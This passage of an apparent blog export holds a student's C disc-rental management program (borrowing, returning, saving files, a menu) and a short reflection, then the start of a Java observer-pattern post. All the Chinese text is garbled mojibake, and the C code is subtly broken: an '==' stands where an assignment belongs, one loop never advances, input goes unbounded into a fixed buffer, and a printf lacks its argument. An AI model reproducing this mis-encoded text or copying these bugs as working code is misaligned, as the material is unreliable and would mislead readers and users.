class="comment">//  continue;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">"è¯·è¾“å…¥å€Ÿé˜…çš„ç¢Ÿç‰‡æ•°é‡ï¼ˆä¸€æ¬¡åªèƒ½å€Ÿé˜…åŒç§ç¢Ÿç‰‡çš„ä¸€ç‰‡ï¼Œä½†æ˜¯å¯ä»¥å€Ÿé˜…"</span></span><br><span class="line">                <span class="string">"ä¸åŒçš„ç¢Ÿç‰‡ï¼‰\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">            <span class="keyword">int</span> status[<span class="number">100</span>];</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥ç¬¬%dä¸ªç¢Ÿç‰‡çš„åå­—\n"</span>, i);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">                dp = *DL;</span><br><span class="line">                <span class="keyword">while</span> (dp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="built_in">buffer</span>, dp-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">                    dp = dp-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp == <span class="literal">NULL</span> || dp-&gt;inventory == <span class="number">0</span>)</span><br><span class="line">                    status[i] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp-&gt;inventory--;</span><br><span class="line">                    RentInfo *newRent = (RentInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(RentInfo));</span><br><span class="line">                    newRent-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                    newRent-&gt;BDate = date;</span><br><span class="line">                    newRent-&gt;CId = cp-&gt;id;</span><br><span class="line">                    newRent-&gt;isReturn = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">strcpy</span>(newRent-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                    <span class="keyword">if</span> (*RL == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        *RL = newRent;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        newRent-&gt;next = *RL;</span><br><span class="line">                        *RL = newRent;</span><br><span class="line">                    &#125;</span><br><span class="line">                    newRent-&gt;isReturn = <span class="number">0</span>;</span><br><span class="line">                    Blist *newBlist = (Blist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Blist));</span><br><span class="line">                    newBlist-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                    <span class="built_in">strcpy</span>(newBlist-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                    <span class="keyword">if</span> (cp-&gt;RentList == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        cp-&gt;RentList = newBlist;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        newBlist-&gt;next = cp-&gt;RentList;</span><br><span class="line">                        cp-&gt;RentList = newBlist;</span><br><span class="line">                    &#125;</span><br><span class="line">                    status[i] == <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++)</span><br><span class="line">                <span class="keyword">if</span> (!status[i])</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"å€Ÿé˜…çš„ç¬¬%dä¸ªç¢Ÿç‰‡å¤±è´¥\n"</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    successCount++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"æœ¬æ¬¡å€Ÿé˜…ç¢Ÿç‰‡æˆåŠŸæ•°é‡ï¼š%dï¼Œå¤±è´¥æ•°é‡ï¼š%d\n"</span>, successCount,</span><br><span class="line">                   count - successCount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ“ä½œæˆåŠŸ\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;  <span class="comment">// 2020 0222 181212</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getDays</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> num1, <span class="keyword">long</span> <span class="keyword">long</span> num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> months[<span class="number">12</span>] = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, year, month, day;</span><br><span class="line">    year = (num1 - num2) / <span class="number">10000000000</span>;</span><br><span class="line">    month = (num1 - num2) / <span class="number">100000000</span>;</span><br><span class="line">    day = (num1 - num2) / <span class="number">1000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= month - <span class="number">2</span>; i++) sum += months[i];</span><br><span class="line">    sum += day;</span><br><span class="line">    sum += year * <span class="number">365</span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">returnDisc</span><span class="params">(RentInfo **RL, DiscInfo **DL, CustomerInfo **CL)</span> </span>&#123;</span><br><span class="line">    DiscInfo *dp = *DL;</span><br><span class="line">    CustomerInfo *cp = *CL;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½’è¿˜äººçš„id,è¾“å…¥â€œ0â€ç»“æŸæœ¬æ¬¡å½’è¿˜\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;id);</span><br><span class="line">        <span class="keyword">if</span> (!id) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span> (cp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cp-&gt;id == id) <span class="keyword">break</span>;</span><br><span class="line">            cp = cp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ç”¨æˆ·ä¸å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½’è¿˜æ—¥æœŸ(æ ¼å¼ï¼šå¹´æœˆæ—¥æ—¶åˆ†ç§’ï¼Œå¦‚20200526192222)\n"</span>);</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> date;</span><br><span class="line">            <span class="comment">// scanf("%lld", &amp;date);</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;date) &amp;&amp;</span><br><span class="line">                   !(date &lt; <span class="number">99999999999999</span> &amp;&amp; date &gt; <span class="number">10000000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"æ—¥æœŸæ ¼å¼é”™è¯¯\n"</span>);</span><br><span class="line">                <span class="comment">//  continue;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½’è¿˜çš„ç¢Ÿç‰‡æ•°é‡\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">            <span class="keyword">int</span> status[<span class="number">100</span>];</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>][<span class="number">50</span>];</span><br><span class="line">            RentInfo *rp;</span><br><span class="line">            <span class="keyword">int</span> totalCost = <span class="number">0</span>, reality = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥ç¬¬%dä¸ªç¢Ÿç‰‡çš„åå­—\n"</span>, i);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, <span class="built_in">buffer</span>[i]);</span><br><span class="line">                rp = *RL;</span><br><span class="line">                <span class="keyword">while</span> (rp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(rp-&gt;DName, <span class="built_in">buffer</span>[i]) &amp;&amp; !(rp-&gt;isReturn)) &#123;</span><br><span class="line">                        rp-&gt;RDate = date;</span><br><span class="line">                        <span class="keyword">int</span> days = getDays(rp-&gt;RDate, rp-&gt;BDate);</span><br><span class="line">                        <span class="comment">// æ—¥æœŸé”™è¯¯</span></span><br><span class="line">                        <span class="keyword">if</span> (days &lt;= <span class="number">0</span>)</span><br><span class="line">                            status[i] = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            rp-&gt;rentNum = days / <span class="number">3</span>;</span><br><span class="line">                            <span class="keyword">if</span> (days % <span class="number">3</span> &gt; <span class="number">0</span>) rp-&gt;rentNum++;</span><br><span class="line">                            totalCost += rp-&gt;rentNum;</span><br><span class="line">                            <span class="comment">// ä¸å¤Ÿé’±</span></span><br><span class="line">                            <span class="keyword">if</span> (cp-&gt;acount + <span class="number">20</span> - rp-&gt;rentNum &lt; <span class="number">0</span>)</span><br><span class="line">                                status[i] = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                reality += rp-&gt;rentNum;</span><br><span class="line">                                cp-&gt;acount = cp-&gt;acount + <span class="number">20</span> - rp-&gt;rentNum;</span><br><span class="line">                                status[i] = <span class="number">1</span>;</span><br><span class="line">                                <span class="comment">// è®°ä¸Šå·²ç»å½’è¿˜</span></span><br><span class="line">                                rp-&gt;isReturn = <span class="number">1</span>;</span><br><span class="line">                                DiscInfo *d = *DL;</span><br><span class="line">                                <span class="keyword">while</span> (d != <span class="literal">NULL</span>)</span><br><span class="line">                                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d-&gt;name, <span class="built_in">buffer</span>[i])) <span class="keyword">break</span>;</span><br><span class="line">                                <span class="comment">//åº“å­˜åŠ ä¸€</span></span><br><span class="line">                                d-&gt;inventory++;</span><br><span class="line">                                Blist *b1 = cp-&gt;RentList-&gt;next,</span><br><span class="line">                                      *b2 = cp-&gt;RentList;</span><br><span class="line">                                <span class="comment">// å¤´èŠ‚ç‚¹</span></span><br><span class="line">                                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cp-&gt;RentList-&gt;DName, <span class="built_in">buffer</span>[i])) &#123;</span><br><span class="line">                                    cp-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">while</span> (b1 != <span class="literal">NULL</span>)</span><br><span class="line">                                        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(b1-&gt;DName, <span class="built_in">buffer</span>[i]))</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        <span class="keyword">else</span> &#123;</span><br><span class="line">                                            b2 = b1;</span><br><span class="line">                                            b1 = b1-&gt;next;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    <span class="comment">// å¤´èŠ‚ç‚¹</span></span><br><span class="line">                                    <span class="keyword">if</span> (b1 == <span class="literal">NULL</span>)</span><br><span class="line">                                        b2 = b2-&gt;next;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        b2-&gt;next = b1-&gt;next;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    rp = rp-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (rp == <span class="literal">NULL</span> || !(rp-&gt;isReturn)) &#123;</span><br><span class="line">                    status[i] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++)</span><br><span class="line">                <span class="keyword">if</span> (!status[i])</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"å½’è¿˜ç¬¬%dä¸ªç¢Ÿç‰‡å¤±è´¥\n"</span>, i);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    successCount++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"æœ¬æ¬¡å½’è¿˜ç¢Ÿç‰‡æˆåŠŸæ•°é‡ï¼š%dï¼Œå¤±è´¥æ•°é‡ï¼š%d\n"</span>, successCount,</span><br><span class="line">                   count - successCount);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"æœ¬æ¬¡å½’è¿˜ç¢Ÿç‰‡éœ€è¦æ”¯ä»˜æ€»è´¹ç”¨%dï¼Œå®é™…æ”¯ä»˜ï¼š%d\n"</span>, totalCost,</span><br><span class="line">                   reality);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ“ä½œæˆåŠŸ\n"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">save</span><span class="params">(RentInfo *RL, DiscInfo *DL, CustomerInfo *CL)</span> </span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">".\\rent.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (RL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, RL-&gt;CId);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, RL-&gt;DName);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%lld "</span>, RL-&gt;BDate);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%lld "</span>, RL-&gt;RDate);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, RL-&gt;rentNum);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%d "</span>, RL-&gt;isReturn);</span><br><span class="line">            fputc(<span class="string">'\n'</span>, fp);</span><br><span class="line">            RL = RL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txtä¿å­˜æˆåŠŸ\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txtä¿å­˜å¤±è´¥\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(<span class="string">".\\customer.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (CL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, CL-&gt;id);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, CL-&gt;name);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, CL-&gt;acount);</span><br><span class="line">            Blist *b = CL-&gt;RentList;</span><br><span class="line">            <span class="keyword">while</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, b-&gt;DName);</span><br><span class="line">                b = b-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">end</span>[] = &#123;<span class="string">'E'</span>, <span class="string">'N'</span>, <span class="string">'D'</span>, <span class="string">'\n'</span>&#125;;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s"</span>, <span class="string">"END\n"</span>);</span><br><span class="line">            CL = CL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txtä¿å­˜æˆåŠŸ\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txtä¿å­˜å¤±è´¥\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(<span class="string">".\\disc.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (DL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;name);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;country);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;type);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;director);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;producer);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;stars);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%d "</span>, DL-&gt;inventory);</span><br><span class="line">            fputc(<span class="string">'\n'</span>, fp);</span><br><span class="line">            DL = DL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txtä¿å­˜æˆåŠŸ\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txtä¿å­˜å¤±è´¥\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CustomerInfo *CL = <span class="literal">NULL</span>;</span><br><span class="line">    DiscInfo *DL = <span class="literal">NULL</span>;</span><br><span class="line">    RentInfo *RL = <span class="literal">NULL</span>;</span><br><span class="line">    customerInitial(&amp;CL);</span><br><span class="line">    discInitial(&amp;DL);</span><br><span class="line">    rentInitial(&amp;RL);</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> choose;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.å½±ç¢Ÿæ·»åŠ \n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.å½±ç¢Ÿåˆ é™¤\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.å½±ç¢Ÿä¿®æ”¹\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.é¡¾å®¢æ·»åŠ \n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.é¡¾å®¢åˆ é™¤\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"6.é¡¾å®¢ä¿®æ”¹\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"7.ç¢Ÿç‰‡æŸ¥è¯¢\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"8.ç¢Ÿç‰‡å€Ÿé˜…\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"9.ç¢Ÿç‰‡å½’è¿˜\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.é€€å‡º\n\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choose);</span><br><span class="line">        <span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                discAdd(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                discDelete(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                discModify(&amp;DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                customerAdd(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                customerDelete(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                customerModify(&amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                discQuery(DL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                borrowDisc(&amp;RL, &amp;DL, &amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                returnDisc(&amp;RL, &amp;DL, &amp;CL);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                save(RL, DL, CL);</span><br><span class="line">                system(<span class="string">"cls"</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"æ­£åœ¨é€€å‡º..."</span>);</span><br><span class="line">                Sleep(<span class="number">1000</span>);</span><br><span class="line">                system(<span class="string">"cls"</span>);</span><br><span class="line">                <span class="built_in">exit</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><ul>
<li><p>å†™å®Œåæ‰å‘ç°<code>time.h</code>åº“æ–‡ä»¶ä¸­å°±æœ‰<code>*time_t</code>ç±»å‹çš„å˜é‡ï¼Œååˆ†æ–¹ä¾¿è®°å½•æ—¶é—´ã€‚è€Œä¸æ˜¯åƒæˆ‘ä¸€æ ·ï¼Œç›´æ¥æ‹¿<code>long long</code>å˜é‡æ¥è¡¨ç¤º<del>~</del>ã€‚</p>
</li>
<li><p>å®¢æˆ·çš„ç»“æ„ä½“è®¾è®¡å¾—ä¸åˆç†ï¼Œåº”è¯¥æŠŠå€Ÿé˜…é˜Ÿåˆ—è®¾ç½®ä¸ºå½±ç¢Ÿç±»å‹ï¼Œè€Œä¸æ˜¯ç®€å•åœ°ç”¨å­—ç¬¦ä¸²ç®€å•è¡¨ç¤ºã€‚</p>
</li>
<li><p>â€¦â€¦â€¦â€¦</p>
</li>
</ul>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>è¯¾ç¨‹è®¾è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¾è®¡æ¨¡å¼ä¹‹è§‚å¯Ÿè€…æ¨¡å¼</title>
    <url>/2020/05/16/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="æ¨¡å¼ä»‹ç»"><a href="#æ¨¡å¼ä»‹ç»" class="headerlink" title="æ¨¡å¼ä»‹ç»"></a>æ¨¡å¼ä»‹ç»</h2><p>å®šä¹‰ï¼š åœ¨å¯¹è±¡ä¹‹é—´å®šä¹‰äº†ä¸€å¯¹å¤šçš„ä¾èµ–ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå½“ä¸€ä¸ªå¯¹è±¡æ”¹å˜çŠ¶æ€ï¼Œä¾èµ–å®ƒçš„å¯¹è±¡ä¼šæ”¶åˆ°é€šçŸ¥å¹¶è‡ªåŠ¨æ›´æ–°ã€‚ ç±»ä¼¼äºå…¬ä¼—å·è®¢é˜…æ¨¡å¼ï¼Œå…¬ä¼—å·å‘å¸ƒæ–°é€šçŸ¥çš„æ—¶å€™åªæœ‰å…³æ³¨äº†è¯¥å…¬ä¼—å·çš„ç”¨æˆ·æ‰ä¼šæ¥æ”¶è¯¥é€šçŸ¥ã€‚<a id="more"></a></p>
<p>è¯¥æ¨¡å¼åŒ…å«å››ä¸ªéƒ¨åˆ†</p>
<ul>
<li>æŠ½è±¡è¢«è§‚å¯Ÿæ¥å£ï¼šå°†åŒç±»çš„æ‰€æœ‰è§‚å¯Ÿè€…ä¿å­˜åœ¨ä¸€ä¸ªé›†åˆä¸­ï¼Œæ¯ä¸€ä¸ªè¢«è§‚å¯Ÿè€…éƒ½å¯ä»¥è¢«è‹¥å¹²ä¸ªè§‚å¯Ÿè€…è§‚å¯Ÿï¼Œè¯¥æ¥å£è‡³å°‘æä¾›æ³¨å†Œè§‚å¯Ÿè€…å’Œæ³¨é”€è§‚å¯Ÿè€…æ–¹æ³•ä»¥åŠé€šçŸ¥è§‚å¯Ÿè€…æ–¹æ³•ã€‚</li>
<li>æŠ½è±¡è§‚å¯Ÿè€…æ¥å£ï¼š å®ƒå®šä¹‰äº†ä¸€ä¸ªæ›´æ–°æ¥å£ï¼Œä½¿å¾—åœ¨å¾—åˆ°è¢«è§‚å¯Ÿè€…æ›´æ”¹é€šçŸ¥æ—¶äº§ç”Ÿç›¸åº”åŠ¨ä½œã€‚ </li>
<li>è¢«è§‚å¯Ÿè€…çš„å®ç°ç±»ï¼š å°†æœ‰å…³çŠ¶æ€å­˜å…¥å…·ä½“è§‚å¯Ÿè€…å¯¹è±¡ï¼Œåœ¨å…·ä½“è¢«è§‚å¯Ÿè€…çš„å†…éƒ¨çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶ï¼Œç»™æ‰€æœ‰æ³¨å†Œè¿‡çš„è§‚å¯Ÿè€…å‘é€é€šçŸ¥ã€‚ </li>
<li>è§‚å¯Ÿè€…çš„å®ç°ç±»ï¼š å®ç°æŠ½è±¡è§‚å¯Ÿè€…å®šä¹‰çš„æ›´æ–°æ¥å£ï¼Œä»¥ä¾¿åœ¨å¾—åˆ°ä¸»é¢˜æ›´æ”¹é€šçŸ¥æ—¶æ›´æ–°è‡ªèº«çš„çŠ¶æ€ã€‚ </li>
</ul>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><h3 id="æŠ½è±¡è§‚å¯Ÿè€…"><a href="#æŠ½è±¡è§‚å¯Ÿè€…" class="headerlink" title="æŠ½è±¡è§‚å¯Ÿè€…"></a>æŠ½è±¡è§‚å¯Ÿè€…</h3><p>æä¾›æŠ½è±¡æ–¹æ³•ç”¨äºæ›´æ–°çŠ¶æ€</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(String msg)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

